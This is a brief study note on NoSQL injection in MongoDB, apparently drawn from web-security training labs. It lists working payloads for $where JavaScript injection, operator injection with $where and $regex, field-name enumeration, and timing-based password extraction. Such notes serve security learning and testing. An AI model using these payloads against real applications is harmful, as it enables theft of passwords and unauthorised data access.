In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as #mongodb `$where` operator and `mapReduce()` function.
## Exfiltrating data in MongoDB
Example:
`https://insecure-website.com/user/lookup?username=admin`
This results in the following query:
`{"$where":"this.username == 'admin'"}`
Payload for data extraction:
`admin' && this.password[0] == 'a' || 'a'=='b`
or
`admin' && this.password.match(/\d/) || 'a'=='b`

#### Identifying field names
Send payload with an existing field:
`admin' && this.username!='`
then with a field you think that exists:
`admin' && this.foo!='`
Compare the results.

## Exploiting NoSQL operator injection to extract data
### Injecting operators in MongoDB
Example:
`{"username":"wiener","password":"peter"}`
Trying to inject `$where` operator:
`{"username":"wiener","password":"peter", "$where":"0"}`
and
`{"username":"wiener","password":"peter", "$where":"1"}`
If there is a difference, this may indicate that $where is being evaluated.
##### Extracting field names
`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
Check if the first symbol is 'a'. Thus we can extract field name char by char.
### Exfiltrating data using operators
Consider a vulnerable application that accepts a username and password in the body of a `POST` request. For example:
`{"username":"myuser","password":"mypass"}`
You could start by testing whether the `$regex` operator is processed as follows:
`{"username":"admin","password":{"$regex":"^a"}}`
and so on.
## Timing based injection
Payloads:
```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```
or
```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
